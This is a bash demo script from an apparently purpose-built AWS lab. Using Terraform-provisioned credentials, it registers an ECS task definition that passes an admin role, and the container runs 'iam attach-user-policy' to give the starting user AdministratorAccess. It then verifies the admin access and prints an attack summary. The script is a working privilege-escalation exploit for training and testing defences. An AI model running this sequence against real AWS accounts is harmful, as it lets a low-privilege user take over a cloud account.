#!/bin/bash

# Demo script for iam:PassRole + ecs:RegisterTaskDefinition + ecs:StartTask privilege escalation
# This scenario demonstrates how a user with PassRole, RegisterTaskDefinition, and StartTask can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ecs-005-to-admin-starting-user"
ADMIN_ROLE="pl-prod-ecs-005-to-admin-target-role"
TASK_DEFINITION_FAMILY="pl-ecs-005-admin-escalation"
TASK_EXECUTION_ROLE="pl-prod-ecs-005-to-admin-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + ECS RegisterTaskDefinition + StartTask Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ecs_005_iam_passrole_ecs_registertaskdefinition_ecs_starttask.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ECS_CLUSTER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ecs_cluster_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "ECS Cluster: $ECS_CLUSTER_NAME"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID and container instance ARN
echo -e "${YELLOW}Step 3: Getting account ID and container instance ARN${NC}"
show_cmd "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"

echo "Retrieving container instance ARN from ECS cluster..."
CONTAINER_INSTANCE_ARN=$(aws ecs list-container-instances \
    --region $AWS_REGION \
    --cluster $ECS_CLUSTER_NAME \
    --query 'containerInstanceArns[0]' \
    --output text)

if [ -z "$CONTAINER_INSTANCE_ARN" ] || [ "$CONTAINER_INSTANCE_ARN" == "None" ]; then
    echo -e "${RED}Error: No container instances found in cluster${NC}"
    echo "The EC2 instance may not have registered with the ECS cluster yet."
    echo "Wait a minute and try again."
    exit 1
fi

echo "Container Instance ARN: $CONTAINER_INSTANCE_ARN"
echo -e "${GREEN}✓ Retrieved account ID and container instance ARN${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Check for attached policies (should have none or minimal)
echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
echo "Listing attached policies for: $STARTING_USER"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text)
if [ -z "$ATTACHED_POLICIES" ]; then
    echo "No managed policies currently attached"
else
    echo "Currently attached policies: $ATTACHED_POLICIES"
fi
echo -e "${GREEN}✓ Verified current policy state${NC}\n"

# Step 6: Register ECS task definition with admin role (PassRole escalation)
echo -e "${YELLOW}Step 6: Registering ECS task definition with admin role${NC}"
echo "This is the privilege escalation vector - creating a task that uses the admin role..."
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Task Family: $TASK_DEFINITION_FAMILY"

# Create task definition JSON with malicious command
# The task will attach AdministratorAccess policy to the starting user
TASK_DEFINITION=$(cat <<EOF
{
  "family": "$TASK_DEFINITION_FAMILY",
  "networkMode": "bridge",
  "requiresCompatibilities": ["EC2"],
  "taskRoleArn": "$ADMIN_ROLE_ARN",
  "executionRoleArn": "$ADMIN_ROLE_ARN",
  "containerDefinitions": [
    {
      "name": "escalation-container",
      "image": "amazon/aws-cli:latest",
      "essential": true,
      "command": [
        "iam",
        "attach-user-policy",
        "--user-name",
        "$STARTING_USER",
        "--policy-arn",
        "arn:aws:iam::aws:policy/AdministratorAccess"
      ],
      "memory": 512,
      "cpu": 256
    }
  ]
}
EOF
)

echo "Registering task definition..."
show_attack_cmd "aws ecs register-task-definition --region $AWS_REGION --cli-input-json \"...\""
TASK_DEF_RESULT=$(aws ecs register-task-definition \
    --region $AWS_REGION \
    --cli-input-json "$TASK_DEFINITION" \
    --output json)

if [ $? -eq 0 ]; then
    TASK_DEF_ARN=$(echo "$TASK_DEF_RESULT" | jq -r '.taskDefinition.taskDefinitionArn')
    TASK_DEF_REVISION=$(echo "$TASK_DEF_RESULT" | jq -r '.taskDefinition.revision')
    echo "Task Definition ARN: $TASK_DEF_ARN"
    echo "Revision: $TASK_DEF_REVISION"
    echo -e "${GREEN}✓ Successfully registered ECS task definition with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to register task definition${NC}"
    exit 1
fi
echo ""

# Step 7: Start the ECS task on the container instance
echo -e "${YELLOW}Step 7: Starting ECS task to escalate privileges${NC}"
echo "Cluster: $ECS_CLUSTER_NAME"
echo "Task Definition: $TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION"
echo "Container Instance: $CONTAINER_INSTANCE_ARN"
echo "This task will attach AdministratorAccess policy to: $STARTING_USER"
echo ""

show_attack_cmd "aws ecs start-task --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task-definition \"$TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION\" --container-instances $CONTAINER_INSTANCE_ARN"
START_TASK_RESULT=$(aws ecs start-task \
    --region $AWS_REGION \
    --cluster $ECS_CLUSTER_NAME \
    --task-definition "$TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION" \
    --container-instances $CONTAINER_INSTANCE_ARN \
    --output json)

if [ $? -eq 0 ]; then
    TASK_ARN=$(echo "$START_TASK_RESULT" | jq -r '.tasks[0].taskArn')
    echo "Task ARN: $TASK_ARN"
    echo -e "${GREEN}✓ Successfully started ECS task!${NC}"
else
    echo -e "${RED}Error: Failed to start ECS task${NC}"
    exit 1
fi
echo ""

# Step 8: Wait for task to complete
echo -e "${YELLOW}Step 8: Waiting for ECS task to complete${NC}"
echo "Monitoring task status..."

MAX_ATTEMPTS=30
ATTEMPT=0
TASK_STATUS="UNKNOWN"

while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
    ATTEMPT=$((ATTEMPT + 1))

    # Get task status
    show_cmd "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
    TASK_INFO=$(aws ecs describe-tasks \
        --region $AWS_REGION \
        --cluster $ECS_CLUSTER_NAME \
        --tasks $TASK_ARN \
        --output json 2>/dev/null)

    if [ $? -eq 0 ]; then
        TASK_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].lastStatus')
        TASK_DESIRED_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].desiredStatus')

        echo "Attempt $ATTEMPT: Task status: $TASK_STATUS (desired: $TASK_DESIRED_STATUS)"

        # Check if task has stopped
        if [ "$TASK_STATUS" == "STOPPED" ]; then
            STOP_CODE=$(echo "$TASK_INFO" | jq -r '.tasks[0].stopCode // "N/A"')
            EXIT_CODE=$(echo "$TASK_INFO" | jq -r '.tasks[0].containers[0].exitCode // "N/A"')
            echo "Task stopped with code: $STOP_CODE"
            echo "Container exit code: $EXIT_CODE"

            if [ "$EXIT_CODE" == "0" ]; then
                echo -e "${GREEN}✓ Task completed successfully!${NC}"
                break
            else
                echo -e "${YELLOW}⚠ Task stopped but may have had issues${NC}"
                break
            fi
        fi
    else
        echo "Warning: Could not describe task (attempt $ATTEMPT)"
    fi

    sleep 5
done

if [ $ATTEMPT -ge $MAX_ATTEMPTS ]; then
    echo -e "${YELLOW}⚠ Warning: Timeout waiting for task completion${NC}"
    echo "Continuing anyway - the policy may have been attached..."
fi
echo ""

# Step 9: Wait for IAM policy to propagate
echo -e "${YELLOW}Step 9: Waiting for IAM policy changes to propagate${NC}"
echo "IAM changes can take time to propagate across AWS infrastructure..."
sleep 15
echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"

# Step 10: Verify policy was attached to starting user
echo -e "${YELLOW}Step 10: Verifying policy attachment${NC}"
echo "Checking attached policies for: $STARTING_USER"

ATTACHED_POLICIES_AFTER=$(aws iam list-attached-user-policies \
    --user-name $STARTING_USER \
    --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
    --output text)

if [ -z "$ATTACHED_POLICIES_AFTER" ]; then
    echo -e "${RED}⚠ Warning: No policies found attached to user${NC}"
    echo "The ECS task may not have completed successfully"
else
    echo "Currently attached policies:"
    echo "$ATTACHED_POLICIES_AFTER"

    if echo "$ATTACHED_POLICIES_AFTER" | grep -q "AdministratorAccess"; then
        echo -e "${GREEN}✓ AdministratorAccess policy successfully attached!${NC}"
    else
        echo -e "${YELLOW}⚠ AdministratorAccess not found in attached policies${NC}"
    fi
fi
echo ""

# Step 11: Verify admin access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_cmd "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "The privilege escalation may not have completed successfully"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, ecs:RegisterTaskDefinition, ecs:StartTask)"
echo "2. Registered ECS task definition with admin role: $ADMIN_ROLE"
echo "3. Task definition configured to attach AdministratorAccess to starting user"
echo "4. Started ECS task on EC2 container instance to execute the privilege escalation"
echo "5. ECS task attached AdministratorAccess policy to starting user"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (PassRole + RegisterTaskDefinition + StartTask)"
echo "  → ECS Task with $ADMIN_ROLE → AttachUserPolicy"
echo "  → $STARTING_USER gains AdministratorAccess → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- ECS Task Definition: $TASK_DEFINITION_FAMILY (revision $TASK_DEF_REVISION)"
echo "- ECS Cluster: $ECS_CLUSTER_NAME"
echo "- Task ARN: $TASK_ARN"
echo "- Policy attached to user: AdministratorAccess"

echo -e "\n${RED}⚠ Warning: The starting user now has AdministratorAccess policy attached${NC}"
echo -e "${RED}⚠ The task definition is still registered${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
